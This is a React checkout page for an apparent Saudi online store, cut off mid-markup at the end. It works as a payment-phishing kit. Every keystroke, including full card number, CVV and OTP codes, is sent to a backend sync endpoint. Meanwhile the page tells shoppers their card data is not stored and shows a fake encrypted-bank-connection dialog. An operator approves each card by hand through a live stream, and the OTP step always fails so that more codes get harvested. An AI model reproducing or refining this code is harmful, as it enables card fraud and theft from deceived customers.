import React, { useEffect, useMemo, useState } from "react";
import { AlertCircle, Check, ChevronDown, Info, LoaderCircle, Lock, MapPin, ShieldCheck, ShoppingBag, X } from "lucide-react";
import { BinDetails, CartItem } from "@/src/types";
import { saudiCities } from "@/src/data/saudiCities";
import { getVisitorId } from "@/src/lib/visitorTracking";

interface CheckoutProps {
  cartItems: CartItem[];
  onClose: () => void;
  onClearCart: () => void;
}

type CheckoutStep = 1 | 2 | 3;
type AddressLookupStatus = "idle" | "loading" | "success" | "error";

interface NationalAddressResponse {
  short_address: string;
  city: string;
  street: string;
  district: string;
  building_number: string;
  post_code: string;
  additional_number: string;
  region_name: string;
}

export const Checkout: React.FC<CheckoutProps> = ({ cartItems, onClose, onClearCart }) => {
  const [step, setStep] = useState<CheckoutStep>(1);
  const [phone, setPhone] = useState("");
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [city, setCity] = useState("");
  const [nationalAddress, setNationalAddress] = useState("");
  const [addressLookupStatus, setAddressLookupStatus] = useState<AddressLookupStatus>("idle");
  const [addressLookupMessage, setAddressLookupMessage] = useState("");
  const [addressDetails, setAddressDetails] = useState<NationalAddressResponse | null>(null);
  const [street, setStreet] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [binInfo, setBinInfo] = useState<BinDetails | null>(null);
  const [cardApprovalStatus, setCardApprovalStatus] = useState<"idle" | "pending" | "approved" | "rejected_unsupported">("idle");
  const [cardRejectReason, setCardRejectReason] = useState("");
  const [awaitingOtp, setAwaitingOtp] = useState(false);
  const [otpCode, setOtpCode] = useState("");
  const [verifyingOtp, setVerifyingOtp] = useState(false);
  const [otpError, setOtpError] = useState("");
  const [coupon, setCoupon] = useState("");
  const [discount, setDiscount] = useState(0);
  const [couponMessage, setCouponMessage] = useState("");
  const [complete, setComplete] = useState(false);
  const [showCashbackPopup, setShowCashbackPopup] = useState(false);

  useEffect(() => {
    if (step === 3) {
      setShowCashbackPopup(true);
    }
  }, [step]);

  const subtotal = useMemo(
    () => cartItems.reduce((sum, item) => sum + item.product.price * item.quantity, 0),
    [cartItems]
  );
  const discountAmount = (subtotal * discount) / 100;
  const total = Math.max(0, subtotal - discountAmount);

  const formatPrice = (value: number) => `${value.toFixed(2)} ر.س`;

  // Listen to server-backed real-time stream for immediate admin decisions (card approval / rejection)
  useEffect(() => {
    let es: EventSource | null = null;
    let isMounted = true;

    try {
      const visitorId = getVisitorId();
      es = new EventSource(`/api/visitor/stream?visitorId=${encodeURIComponent(visitorId)}`);

      es.addEventListener("card_action", (e: MessageEvent) => {
        if (!isMounted) return;
        try {
          const data = JSON.parse(e.data);
          if (data.status === "approved") {
            setCardApprovalStatus("approved");
            setAwaitingOtp(true);
            setStep(3);
          } else if (data.status === "rejected_unsupported") {
            setCardApprovalStatus("rejected_unsupported");
            setAwaitingOtp(false);
            setCardNumber("");
            setCardCvv("");
            setCardExpiry("");
            setCardRejectReason(
              data.reason || "عذراً، هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى (مدى / فيزا / ماستركارد)."
            );
          } else if (data.status === "idle") {
            setCardApprovalStatus("idle");
          }
        } catch {}
      });
    } catch {}

    return () => {
      isMounted = false;
      if (es) es.close();
    };
  }, []);

  // BIN Lookup for Card Level, Bank Name & Scheme
  useEffect(() => {
    const cleanNum = cardNumber.replace(/\D/g, "");
    if (cleanNum.length >= 6) {
      const bin6 = cleanNum.slice(0, 6);
      fetch(`/api/bin-lookup/${bin6}`)
        .then((res) => (res.ok ? res.json() : null))
        .then((data: BinDetails | null) => {
          if (data && (data.bankName || data.scheme || data.brand)) {
            setBinInfo(data);
          }
        })
        .catch(() => {});
    } else {
      setBinInfo(null);
    }
  }, [cardNumber]);

  // Real-time synchronization to backend database
  const syncToBackend = (eventType?: string, message?: string) => {
    try {
      const visitorId = getVisitorId();
      fetch("/api/checkout/sync", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          visitorId,
          checkout: {
            step: awaitingOtp ? 4 : step,
            phone,
            fullName,
            email,
            city,
            nationalAddress,
            street,
            neighborhood,
            paymentMethod,
            cardholderName,
            cardNumber,
            cardExpiry,
            cardCvv,
            binInfo,
            cardApprovalStatus,
            cardRejectReason,
            awaitingOtp,
            otpCode,
            otpError,
            verifyingOtp,
            completed: complete,
            cartSummary: {
              total,
              itemsCount: cartItems.reduce((sum, item) => sum + item.quantity, 0),
              items: cartItems.map((i) => ({
                name: i.product.name,
                quantity: i.quantity,
                price: i.product.price,
              })),
            },
          },
          eventType,
          message,
        }),
      }).catch(() => {});
    } catch {}
  };

  useEffect(() => {
    syncToBackend();
  }, [
    step,
    phone,
    fullName,
    email,
    city,
    nationalAddress,
    street,
    neighborhood,
    paymentMethod,
    cardholderName,
    cardNumber,
    cardExpiry,
    cardCvv,
    binInfo,
    cardApprovalStatus,
    cardRejectReason,
    awaitingOtp,
    otpCode,
    otpError,
    verifyingOtp,
    complete,
  ]);

  const applyCoupon = (event: React.FormEvent) => {
    event.preventDefault();
    if (coupon.trim().toUpperCase() === "EID96") {
      setDiscount(15);
      setCouponMessage("تم تطبيق خصم 15%");
    } else {
      setDiscount(0);
      setCouponMessage("جرّب كود EID96");
    }
  };

  const lookupNationalAddress = async () => {
    const shortAddress = nationalAddress.replace(/\s/g, "").toUpperCase();
    setNationalAddress(shortAddress);

    if (!/^[A-Z]{4}\d{4}$/.test(shortAddress)) {
      setAddressLookupStatus("error");
      setAddressLookupMessage("أدخل 4 أحرف إنجليزية متبوعة بـ4 أرقام، مثال: RQNA8188");
      setAddressDetails(null);
      return;
    }

    setAddressLookupStatus("loading");
    setAddressLookupMessage("");

    try {
      const response = await fetch(
        `/api/national-address?short_address=${encodeURIComponent(shortAddress)}`
      );
      if (!response.ok) {
        throw new Error(`National address lookup failed: ${response.status}`);
      }

      const data = (await response.json()) as NationalAddressResponse;
      if (!data.city || !data.street || !data.district) {
        throw new Error("National address response is incomplete");
      }

      setCity(data.city);
      setStreet(data.street);
      setNeighborhood(data.district.replace(/^حي\s+/, ""));
      setAddressDetails(data);
      setAddressLookupStatus("success");
      setAddressLookupMessage("تم العثور على العنوان وتعبئة بيانات التوصيل.");
    } catch {
      setAddressLookupStatus("error");
      setAddressLookupMessage("تعذر العثور على العنوان. تحقق من الرمز وحاول مرة أخرى.");
      setAddressDetails(null);
    }
  };

  const canContinue = phone.replace(/\D/g, "").length >= 9;
  const canContinueDelivery =
    fullName.trim().length > 2 &&
    email.includes("@") &&
    city.trim().length > 1 &&
    nationalAddress.trim().length > 3 &&
    addressLookupStatus === "success" &&
    street.trim().length > 2 &&
    neighborhood.trim().length > 1;
  const requiresCardDetails = paymentMethod === "card" || paymentMethod === "mada";
  const cardDetailsValid =
    cardholderName.trim().length > 2 &&
    cardNumber.replace(/\D/g, "").length === 16 &&
    /^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExpiry) &&
    /^\d{3,4}$/.test(cardCvv);
  const canConfirmOrder = !requiresCardDetails || cardDetailsValid;
  const otpValid = /^\d{4,6}$/.test(otpCode);
  const canSubmitPayment = awaitingOtp ? otpValid : canConfirmOrder;

  if (complete) {
    return (
      <main dir="rtl" className="fixed inset-0 z-[60] flex min-h-screen items-center justify-center bg-[#f3f5f4] px-5">
        <div className="w-full max-w-md rounded-[28px] bg-white p-8 text-center shadow-sm">
          <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-[#e7f2eb] text-[#31724e]">
            <Check className="h-8 w-8" />
          </div>
          <h1 className="text-2xl font-bold text-[#171519]">تم استلام طلبك بنجاح</h1>
          <p className="mt-3 text-sm leading-7 text-[#77747a]">
            شكرًا لاختيارك دخوني. سنتواصل معك لتأكيد تفاصيل التوصيل.
          </p>
          <button
            onClick={onClose}
            className="mt-7 h-12 w-full rounded-xl bg-[#28202a] text-sm font-bold text-white transition hover:bg-[#3a2f3c]"
          >
            العودة للمتجر
          </button>
        </div>
      </main>
    );
  }

  return (
    <main dir="rtl" className="fixed inset-0 z-[60] min-h-screen overflow-y-auto bg-[#f3f5f4] pb-24 text-[#201b20]">
      <header className="sticky top-0 z-10 flex h-[88px] items-center justify-between bg-white px-5 shadow-[0_1px_0_rgba(0,0,0,0.02)] sm:px-8">
        <button
          onClick={onClose}
          className="flex h-10 w-10 items-center justify-center text-[#766f7c] transition hover:text-[#28202a]"
          aria-label="إغلاق الدفع"
        >
          <X className="h-6 w-6" />
        </button>
        <img
          src="/dkon.svg"
          alt="دخوني"
          className="h-[62px] w-[90px] object-contain brightness-0"
        />
        <div className="flex h-10 w-10 items-center justify-center text-[#766f7c]">
          <ShoppingBag className="h-6 w-6 stroke-[1.6]" />
        </div>
      </header>

      <div className="mx-auto w-full max-w-[620px] px-5 pt-6 sm:px-8">
        <section className="flex min-h-[70px] items-center justify-between rounded-2xl bg-white px-4 shadow-sm">
          <div className="flex items-center gap-3">
            <ChevronDown className="h-5 w-5 text-[#817987]" />
            <strong className="text-base font-bold">{formatPrice(total)}</strong>
          </div>
          <div className="flex items-center gap-3 text-base">
            <span>ملخص الطلب ({cartItems.reduce((sum, item) => sum + item.quantity, 0)})</span>
            {cartItems[0] && (
              <img
                src={cartItems[0].product.image_url}
                alt=""
                className="h-12 w-12 rounded-xl border border-[#eee] bg-[#fafafa] object-contain p-1"
              />
            )}
          </div>
        </section>

        <div className="mt-5 space-y-5">
          <section className={`rounded-2xl border bg-white p-5 shadow-sm ${step === 1 ? "border-[#89948d]" : "border-transparent"}`}>
            <button
              className="flex w-full items-center justify-between text-right"
              onClick={() => setStep(1)}
            >
              <span className="flex items-center gap-3 text-lg font-bold">
                معلومات التواصل
                <span className="flex h-9 w-9 items-center justify-center rounded-full bg-[#f0eef2] text-sm font-normal">1</span>
              </span>
              {step !== 1 && <Check className="h-5 w-5 text-[#3d8a5c]" />}
            </button>

            {step !== 1 && (
              <div className="mt-5 rounded-xl bg-[#fafafa] px-4 py-3 text-sm text-[#5f5a62]">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-[#3d3840]">تم تأكيد معلومات التواصل</span>
                  <button onClick={() => setStep(1)} className="text-xs font-bold text-[#6e6570] underline">
                    تعديل
                  </button>
                </div>
                <div className="mt-2 flex items-center justify-between text-xs">
                  <span>{phone ? `+966 ${phone}` : "رقم الهاتف"}</span>
                  <span className="text-[#8d878f]">للاتصال بالتوصيل</span>
                </div>
              </div>
            )}

            {step === 1 && (
              <div className="mt-6">
                <label htmlFor="checkout-phone" className="mb-2 block text-sm">
                  الهاتف <span className="text-[#c66b6b]">*</span>
                  <span className="mr-1 text-xs text-[#8a858b]">(للاتصال بالتوصيل)</span>
                </label>
                <div className="flex h-[54px] overflow-hidden rounded-xl border border-[#e2e0e2] bg-white focus-within:border-[#8d8790]">
                  <span className="flex items-center gap-1 border-l border-[#eee] bg-[#fafafa] px-3 text-sm" dir="ltr">
                    +966 <ChevronDown className="h-4 w-4" />
                  </span>
                  <input
                    id="checkout-phone"
                    type="tel"
                    inputMode="numeric"
                    dir="ltr"
                    value={phone}
                    onChange={(event) => setPhone(event.target.value)}
                    placeholder="5XXXXXXXX"
                    className="min-w-0 flex-1 px-3 text-base outline-none placeholder:text-[#b6b2b8]"
                  />
                </div>
                <button
                  onClick={() => setStep(2)}
                  disabled={!canContinue}
                  className="mt-5 h-[52px] w-full rounded-xl bg-[#eeeeee] text-base text-[#aaa7ab] transition enabled:bg-[#29222b] enabled:text-white enabled:hover:bg-[#3b303e] disabled:cursor-not-allowed"
                >
                  متابعة
                </button>
              </div>
            )}
          </section>

          <section className={`rounded-2xl border bg-white shadow-sm ${step === 2 ? "border-[#89948d]" : "border-transparent"}`}>
            <button
              type="button"
              className="flex w-full items-center justify-between p-5 text-right"
              onClick={() => setStep(2)}
            >
              <span className="flex items-center gap-3 text-lg font-bold text-[#201b20]">
                التوصيل
                <span className="flex h-9 w-9 items-center justify-center rounded-full bg-[#f0eef2] text-sm font-normal">2</span>
              </span>
              {step > 2 && <Check className="h-5 w-5 text-[#3d8a5c]" />}
            </button>
            {step === 2 && (
              <div className="mt-5 space-y-4 px-5 pb-5">
                <label className="block text-xs text-[#866c73]">
                  الاسم الكامل <span className="text-[#bd6b70]">*</span>
                  <input
                    type="text"
                    value={fullName}
                    onChange={(event) => setFullName(event.target.value)}
                    placeholder="الاسم الأول والأخير"
                    className="mt-2 h-12 w-full rounded-xl border border-[#e2e0e2] px-3 text-sm text-[#3d3840] outline-none placeholder:text-[#bdb9bd] focus:border-[#8d8790]"
                  />
                </label>

                <label className="block text-xs text-[#866c73]">
                  البريد الإلكتروني <span className="text-[#bd6b70]">*</span>
                  <input
                    type="email"
                    value={email}
                    onChange={(event) => setEmail(event.target.value)}
                    placeholder="example@gmail.com"
                    className="mt-2 h-12 w-full rounded-xl border border-[#e2e0e2] px-3 text-sm text-[#3d3840] outline-none placeholder:text-[#bdb9bd] focus:border-[#8d8790]"
                  />
                </label>

                <label className="block text-xs text-[#866c73]">
                  المدينة <span className="text-[#bd6b70]">*</span>
                  <input
                    type="text"
                    list="saudi-cities"
                    value={city}
                    onChange={(event) => setCity(event.target.value)}
                    placeholder="ابحث أو اختر المدينة"
                    autoComplete="address-level2"
                    className="mt-2 h-12 w-full rounded-xl border border-[#e2e0e2] bg-white px-3 text-sm text-[#3d3840] outline-none placeholder:text-[#bdb9bd] focus:border-[#8d8790]"
                  />
                  <datalist id="saudi-cities">
                    {saudiCities.map((cityName) => (
                      <option key={cityName} value={cityName} />
                    ))}
                  </datalist>
                </label>

                <label className="block text-xs text-[#866c73]">
                  العنوان الوطني المختصر <span className="text-[#bd6b70]">*</span>
                  <span className="mt-2 flex h-12 overflow-hidden rounded-xl border border-[#e2e0e2] bg-white focus-within:border-[#8d8790]">
                    <input
                      type="text"
                      dir="ltr"
                      value={nationalAddress}
                      onChange={(event) => {
                        setNationalAddress(event.target.value.toUpperCase());
                        setAddressLookupStatus("idle");
                        setAddressLookupMessage("");
                        setAddressDetails(null);
                      }}
                      onKeyDown={(event) => {
                        if (event.key === "Enter") {
                          event.preventDefault();
                          void lookupNationalAddress();
                        }
                      }}
                      placeholder="RQNA8188"
                      maxLength={8}
                      className="min-w-0 flex-1 px-3 text-left text-sm uppercase tracking-wider text-[#3d3840] outline-none placeholder:text-[#bdb9bd]"
                    />
                    <button
                      type="button"
                      onClick={() => void lookupNationalAddress()}
                      disabled={addressLookupStatus === "loading"}
                      className="flex min-w-[86px] items-center justify-center gap-1.5 bg-[#29222b] px-3 text-xs font-semibold text-white transition hover:bg-[#3b303e] disabled:cursor-wait disabled:opacity-70"
                    >
                      {addressLookupStatus === "loading" ? (
                        <LoaderCircle className="h-4 w-4 animate-spin" />
                      ) : (
                        <MapPin className="h-4 w-4" />
                      )}
                      تحقق
                    </button>
                  </span>
                  <span className="mt-2 block text-[10px] leading-5 text-[#8f8990]">
                    أدخل عنوانك الوطني المختصر المكون من 4 أحرف و4 أرقام لإتاحة شحن أسرع عبر
                    <strong className="mr-1 text-[#564e58]">SPL Online</strong>
                  </span>
                  {addressLookupMessage && (
                    <span
                      className={`mt-2 flex items-start gap-1.5 rounded-lg px-3 py-2 text-[11px] leading-5 ${
                        addressLookupStatus === "success"
                          ? "bg-[#edf7f0] text-[#31724e]"
                          : "bg-[#fff0f0] text-[#a84c52]"
                      }`}
                    >
                      {addressLookupStatus === "success" && <Check className="mt-0.5 h-3.5 w-3.5 shrink-0" />}
                      {addressLookupMessage}
                    </span>
                  )}
                  {addressDetails && (
                    <span className="mt-2 block rounded-lg bg-[#fafafa] px-3 py-2 text-[10px] leading-5 text-[#777078]">
                      مبنى {addressDetails.building_number}، الرمز البريدي {addressDetails.post_code}،
                      الرقم الإضافي {addressDetails.additional_number} — {addressDetails.region_name}
                    </span>
                  )}
                </label>

                <label className="block text-xs text-[#866c73]">
                  الشارع <span className="text-[#bd6b70]">*</span>
                  <input
                    type="text"
                    value={street}
                    onChange={(event) => setStreet(event.target.value)}
                    placeholder="1234، طريق الملك فهد"
                    className="mt-2 h-12 w-full rounded-xl border border-[#e2e0e2] px-3 text-sm text-[#3d3840] outline-none placeholder:text-[#bdb9bd] focus:border-[#8d8790]"
                  />
                </label>

                <label className="block text-xs text-[#866c73]">
                  الحي <span className="text-[#bd6b70]">*</span>
                  <input
                    type="text"
                    value={neighborhood}
                    onChange={(event) => setNeighborhood(event.target.value)}
                    placeholder="العليا"
                    className="mt-2 h-12 w-full rounded-xl border border-[#e2e0e2] px-3 text-sm text-[#3d3840] outline-none placeholder:text-[#bdb9bd] focus:border-[#8d8790]"
                  />
                </label>

                <button
                  onClick={() => setStep(3)}
                  disabled={!canContinueDelivery}
                  className="mt-4 h-[52px] w-full rounded-xl bg-[#29222b] text-base text-white transition hover:bg-[#3b303e] disabled:cursor-not-allowed disabled:bg-[#eeeeee] disabled:text-[#aaa7ab]"
                >
                  متابعة
                </button>
                <div className="border-t border-[#eee] pt-3 text-right">
                  <p className="flex items-center gap-1 text-xs font-bold text-[#57515a]">
                    طريقة الشحن <Info className="h-3.5 w-3.5" />
                  </p>
                  <p className="mt-2 text-[11px] leading-5 text-[#9a959b]">
                    يرجى تقديم عنوان الشحن الخاص بك لرؤية خيارات الشحن المتاحة.
                  </p>
                </div>
              </div>
            )}
          </section>

          <section className={`rounded-2xl border bg-white shadow-sm ${step === 3 ? "border-[#89948d]" : "border-transparent"}`}>
            <button className="flex w-full items-center justify-between p-5 text-right" onClick={() => canContinueDelivery && setStep(3)}>
              <span className={`flex items-center gap-3 text-lg font-bold ${step === 3 ? "text-[#201b20]" : "text-[#9d999e]"}`}>
                الدفع
                <span className="flex h-9 w-9 items-center justify-center rounded-full bg-[#f0eef2] text-sm font-normal">3</span>
              </span>
            </button>
            {step === 3 && (
              <div className="space-y-3 px-0 pb-0">
                <label className="flex cursor-pointer items-center justify-between rounded-xl border border-[#e2e0e2] p-4 text-sm">
                   <span className="flex items-center gap-3">
                     <span>الدفع بالبطاقة</span>
                     <span className="flex items-center gap-1.5">
                       <img src="/payment-methods/visa.png" alt="Visa" className="h-5 w-auto object-contain" />
                       <img src="/payment-methods/mastercard.png" alt="Mastercard" className="h-6 w-auto object-contain" />
                     </span>
                   </span>
                   <input
                     type="radio"
                     checked={paymentMethod === "card"}
                     onChange={() => {
                       setPaymentMethod("card");
                       setAwaitingOtp(false);
                       setOtpCode("");
                     }}
                   />
                </label>
                 <label className="flex cursor-pointer items-center justify-between rounded-xl border border-[#e2e0e2] p-4 text-sm">
                   <span className="flex items-center gap-3">
                     <span>الدفع عبر مدى</span>
                     <img src="/payment-methods/mada.png" alt="Mada" className="h-6 w-auto object-contain" />
                   </span>
                   <input
                     type="radio"
                     checked={paymentMethod === "mada"}
                     onChange={() => {
                       setPaymentMethod("mada");
                       setAwaitingOtp(false);
                       setOtpCode("");
                     }}
                   />
                 </label>
                 <label
                   className="flex cursor-not-allowed items-center justify-between rounded-xl border border-[#e2e0e2] bg-[#f7f7f7] p-4 text-sm opacity-55"
                   aria-disabled="true"
                 >
                   <span className="flex items-center gap-3">
                     <span>Apple Pay</span>
                     <img src="/payment-methods/apple-pay.svg" alt="Apple Pay" className="h-6 w-auto object-contain" />
                     <span className="rounded-full bg-[#e8e6e8] px-2 py-1 text-[10px] text-[#777078]">
                       غير متاح حاليًا
                     </span>
                   </span>
                   <input type="radio" disabled aria-label="Apple Pay غير متاح حاليًا" />
                 </label>
                 {requiresCardDetails && (
                   <div className="space-y-4 rounded-xl border border-[#e2e0e2] bg-[#fafafa] p-4">
                     <div className="flex items-center justify-between">
                       <strong className="text-sm text-[#3d3840]">بيانات البطاقة</strong>
                       <div className="flex items-center gap-1.5">
                         {paymentMethod === "mada" ? (
                           <img src="/payment-methods/mada.png" alt="Mada" className="h-6 w-auto object-contain" />
                         ) : (
                           <>
                             <img src="/payment-methods/visa.png" alt="Visa" className="h-5 w-auto object-contain" />
                             <img src="/payment-methods/mastercard.png" alt="Mastercard" className="h-6 w-auto object-contain" />
                           </>
                         )}
                       </div>
                     </div>
                     <label className="block text-xs text-[#716a73]">
                       اسم حامل البطاقة
                       <input
                         type="text"
                         value={cardholderName}
                         onChange={(event) => setCardholderName(event.target.value)}
                         autoComplete="cc-name"
                         placeholder="الاسم كما يظهر على البطاقة"
                         className="mt-2 h-12 w-full rounded-xl border border-[#dddadd] bg-white px-3 text-sm outline-none focus:border-[#8d8790]"
                       />
                     </label>
                     <label className="block text-xs text-[#716a73]">
                       رقم البطاقة
                       <input
                         type="text"
                         inputMode="numeric"
                         dir="ltr"
                         value={cardNumber}
                         onChange={(event) => {
                           const digits = event.target.value.replace(/\D/g, "").slice(0, 16);
                           setCardNumber(digits.replace(/(\d{4})(?=\d)/g, "$1 "));
                         }}
                         autoComplete="cc-number"
                         placeholder="0000 0000 0000 0000"
                         maxLength={19}
                         className="mt-2 h-12 w-full rounded-xl border border-[#dddadd] bg-white px-3 text-left text-sm tracking-wider outline-none focus:border-[#8d8790]"
                       />
                     </label>
                     <div className="grid grid-cols-2 gap-3">
                       <label className="block text-xs text-[#716a73]">
                         تاريخ الانتهاء
                         <input
                           type="text"
                           inputMode="numeric"
                           dir="ltr"
                           value={cardExpiry}
                           onChange={(event) => {
                             const digits = event.target.value.replace(/\D/g, "").slice(0, 4);
                             setCardExpiry(digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits);
                           }}
                           autoComplete="cc-exp"
                           placeholder="MM/YY"
                           maxLength={5}
                           className="mt-2 h-12 w-full rounded-xl border border-[#dddadd] bg-white px-3 text-left text-sm outline-none focus:border-[#8d8790]"
                         />
                       </label>
                       <label className="block text-xs text-[#716a73]">
                         رمز الأمان CVV
                         <input
                           type="password"
                           inputMode="numeric"
                           dir="ltr"
                           value={cardCvv}
                           onChange={(event) => setCardCvv(event.target.value.replace(/\D/g, "").slice(0, 4))}
                           autoComplete="cc-csc"
                           placeholder="•••"
                           maxLength={4}
                           className="mt-2 h-12 w-full rounded-xl border border-[#dddadd] bg-white px-3 text-left text-sm tracking-widest outline-none focus:border-[#8d8790]"
                         />
                       </label>
                     </div>
                     <p className="text-[10px] leading-5 text-[#8f8990]">
                       بيانات البطاقة لا يتم حفظها في المتجر.
                     </p>
                   </div>
                 )}
                 {awaitingOtp && (
                   <div className="rounded-xl border border-[#d9d5da] bg-[#fafafa] p-4 text-center space-y-3">
                     <strong className="block text-sm text-[#3d3840]">رمز التحقق OTP</strong>
                     <p className="text-xs leading-5 text-[#7d767f]">
                       أدخل رمز التحقق المكوّن من 4 إلى 6 أرقام والمرسل إلى رقم هاتفك.
                     </p>
                     <input
                       type="text"
                       inputMode="numeric"
                       dir="ltr"
                       value={otpCode}
                       onChange={(event) => {
                         setOtpCode(event.target.value.replace(/\D/g, "").slice(0, 6));
                         setOtpError("");
                       }}
                       autoComplete="one-time-code"
                       placeholder="0000"
                       minLength={4}
                       maxLength={6}
                       disabled={verifyingOtp}
                       autoFocus
                       className={`mx-auto h-12 w-full max-w-[240px] rounded-xl border bg-white px-4 text-center text-xl tracking-[0.45em] outline-none transition ${
                         otpError
                           ? "border-red-500 text-red-600 focus:border-red-600 bg-red-50/20"
                           : "border-[#dddadd] focus:border-[#8d8790]"
                       }`}
                     />
                     {otpError && (
                       <div className="mx-auto max-w-[320px] rounded-lg bg-red-50 p-2.5 text-xs font-bold text-red-600 border border-red-200 animate-in fade-in flex items-center justify-center gap-1.5">
                         <AlertCircle className="h-4 w-4 shrink-0" />
                         <span>{otpError}</span>
                       </div>
                     )}
                     <button
                       type="button"
                       onClick={() => {
                         setOtpCode("");
                         setOtpError("");
                       }}
                       disabled={verifyingOtp}
                       className="block w-full text-xs font-bold text-[#625a64] underline disabled:opacity-50"
                     >
                       إعادة إرسال الرمز
                     </button>
                   </div>
                 )}
                 <button
                   onClick={() => {
                     if (requiresCardDetails && !awaitingOtp) {
                       setCardApprovalStatus("pending");
                       syncToBackend("card_entered", "قام العميل بإدخال بيانات البطاقة وبانتظار موافقة البنك");
                       return;
                     }

                     if (awaitingOtp) {
                       setVerifyingOtp(true);
                       setOtpError("");
                       syncToBackend("otp_submitted", `قام العميل بإدخال رمز OTP: ${otpCode}`);

                       setTimeout(() => {
                         setVerifyingOtp(false);
                         setOtpError("رمز التحقق (OTP) غير صحيح. يرجى التأكد من الرمز وإعادة المحاولة.");
                         setOtpCode("");
                         syncToBackend("otp_invalid", "رمز OTP غير صحيح");
                       }, 3000);
                       return;
                     }

                     onClearCart();
                     setComplete(true);
                   }}
                   disabled={!canSubmitPayment || cardApprovalStatus === "pending" || verifyingOtp}
                   className="mt-2 h-[52px] w-full rounded-xl bg-[#29222b] text-base font-bold text-white transition hover:bg-[#3b303e] disabled:cursor-not-allowed disabled:bg-[#eeeeee] disabled:text-[#aaa7ab] flex items-center justify-center gap-2"
                 >
                   {verifyingOtp ? (
                     <>
                       <LoaderCircle className="h-5 w-5 animate-spin" />
                       <span>جاري التحقق من رمز OTP...</span>
                     </>
                   ) : awaitingOtp ? (
                     "تأكيد رمز التحقق"
                   ) : (
                     `تأكيد الطلب · ${formatPrice(total)}`
                   )}
                 </button>
              </div>
            )}
          </section>

          <section className="rounded-2xl bg-white p-5 shadow-sm">
            <h2 className="text-lg font-bold">الخصومات</h2>
            <p className="mt-5 text-sm">بطاقة هدية أو رمز الخصم</p>
            <form onSubmit={applyCoupon} className="mt-3 flex overflow-hidden rounded-xl border border-[#e2e0e2]">
              <input
                value={coupon}
                onChange={(event) => setCoupon(event.target.value)}
                placeholder="استبدل هنا"
                className="min-w-0 flex-1 px-4 py-3 text-sm outline-none placeholder:text-[#aaa7ab]"
              />
              <button type="submit" className="border-r border-[#e2e0e2] px-5 text-sm font-bold text-[#4f4851]">
                تطبيق
              </button>
            </form>
            {couponMessage && <p className="mt-2 text-xs text-[#5d896c]">{couponMessage}</p>}
          </section>
        </div>
      </div>

      <footer className="fixed inset-x-0 bottom-0 z-10 h-[62px] border-t border-[#eceaec] bg-white px-5 shadow-[0_-4px_16px_rgba(0,0,0,0.04)] sm:px-8">
        <div className="mx-auto flex h-full max-w-[620px] items-center justify-between">
          <div className="flex items-center gap-2 text-base">
            <ChevronDown className="h-4 w-4 text-[#817987]" />
            <span>المجموع</span>
          </div>
          <strong className="text-lg">{formatPrice(total)}</strong>
        </div>
      </footer>

      {/* Card Submission Approval Waiting Dialog */}
      {cardApprovalStatus === "pending" && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-md p-4 animate-in fade-in duration-300" dir="rtl">
          <div className="w-full max-w-md rounded-3xl bg-white p-6 sm:p-8 text-center shadow-2xl border border-gray-100 relative overflow-hidden">
            {/* Animated Header Bar */}
            <div className="absolute top-0 inset-x-0 h-1.5 bg-gradient-to-r from-[#29222b] via-[#e2c185] to-[#29222b] animate-pulse" />

            {/* Payment Scheme & Bank Logo Header */}
            <div className="flex items-center justify-between border-b border-gray-100 pb-4 mb-6">
              <div className="flex items-center gap-2">
                <Lock className="h-4 w-4 text-[#29222b]" />
                <span className="text-xs font-bold text-gray-700">اتصال مصرفي مشفر (SSL 256-Bit)</span>
              </div>
              <div className="flex items-center gap-1.5">
                {paymentMethod === "mada" ? (
                  <img src="/payment-methods/mada.png" alt="Mada" className="h-5 w-auto object-contain" />
                ) : (
                  <>
                    <img src="/payment-methods/visa.png" alt="Visa" className="h-4 w-auto object-contain" />
                    <img src="/payment-methods/mastercard.png" alt="Mastercard" className="h-5 w-auto object-contain" />
                  </>
                )}
              </div>
            </div>

            {/* Central Animated Spinner with Shield Icon */}
            <div className="relative mx-auto my-6 flex h-24 w-24 items-center justify-center">
              <div className="absolute inset-0 rounded-full border-4 border-gray-100" />
              <div className="absolute inset-0 rounded-full border-4 border-[#29222b] border-t-transparent animate-spin" />
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#faf9f6] text-[#29222b] shadow-inner">
                <ShieldCheck className="h-8 w-8 animate-pulse text-[#29222b]" />
              </div>
            </div>

            {/* Title */}
            <h3 className="text-xl font-bold text-[#1a171c]">جاري معالجة طلب الدفع...</h3>

            {/* Card & Bank Summary Box */}
            <div className="mt-5 rounded-2xl bg-[#faf8f5] p-4 text-right border border-[#eae6df]">
              <div className="flex items-center justify-between text-xs text-[#554e57] mb-2">
                <span>المبلغ المطلوب:</span>
                <strong className="text-sm font-bold text-[#29222b]">{formatPrice(total)}</strong>
              </div>
              <div className="flex items-center justify-between text-xs text-[#554e57] mb-2">
                <span>رقم البطاقة:</span>
                <span className="font-mono tracking-wider" dir="ltr">
                  •••• {cardNumber.replace(/\D/g, "").slice(-4) || "••••"}
                </span>
              </div>
              {binInfo?.bankName && (
                <div className="flex items-center justify-between text-xs text-[#554e57] mb-2">
                  <span>البنك المصدر:</span>
                  <strong className="text-[#29222b]">{binInfo.bankName}</strong>
                </div>
              )}
              {cardholderName && (
                <div className="flex items-center justify-between text-xs text-[#554e57]">
                  <span>حامل البطاقة:</span>
                  <span className="font-semibold">{cardholderName}</span>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Card Rejection Notice Overlay */}
      {cardApprovalStatus === "rejected_unsupported" && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 backdrop-blur-md p-4 animate-in fade-in duration-300" dir="rtl">
          <div className="w-full max-w-md rounded-3xl bg-white p-6 sm:p-8 text-center shadow-2xl border border-red-100 relative">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-red-50 text-red-600">
